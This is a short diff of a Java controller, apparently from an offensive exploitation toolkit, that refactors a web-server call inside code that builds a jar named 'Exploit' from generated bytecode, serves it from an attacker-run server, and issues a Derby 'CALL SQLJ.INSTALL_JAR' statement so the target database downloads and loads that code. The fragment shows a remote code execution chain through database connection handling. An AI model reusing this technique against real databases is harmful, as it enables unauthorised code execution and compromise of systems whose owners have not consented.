@@ -48,7 +48,7 @@ public class HikariCPController extends DatabaseController {
 
         String jarName = "Exploit";
         byte[] jarBytes = JarUtil.create(jarName, clazz.toBytecode());
-        WebServer.serveFile("/" + jarName + ".jar", jarBytes);
+        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);
 
         String sql = "CALL SQLJ.INSTALL_JAR('" + Config.codebase + jarName + ".jar', 'APP." + "Exploit" + "', 0)";
 
